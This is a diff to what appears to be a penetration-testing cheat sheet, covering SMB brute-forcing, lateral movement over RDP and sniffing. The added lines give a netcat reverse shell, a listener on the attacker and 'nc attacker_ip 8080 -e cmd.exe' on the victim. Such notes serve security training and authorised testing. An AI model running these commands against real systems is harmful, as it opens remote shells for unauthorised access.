@@ -118,8 +118,10 @@
     Bruteforce SMB            : auxiliary/scanner/smb/smb_login
 
 ### 8.Lateral Movement
-    RDP from kali             : xfreerdp /u:guest_1 /p:guestpwd /v:Target
-
+    RDP from kali                             : xfreerdp /u:guest_1 /p:guestpwd /v:Target
+    Getiing shell from Windows using netcat   : 
+            - On attacker machine  : nc -lvp 8080
+            - On the victime       : nc attacker_ip 8080 -e cmd.exe 
 
 ### 9.Sniffing
 
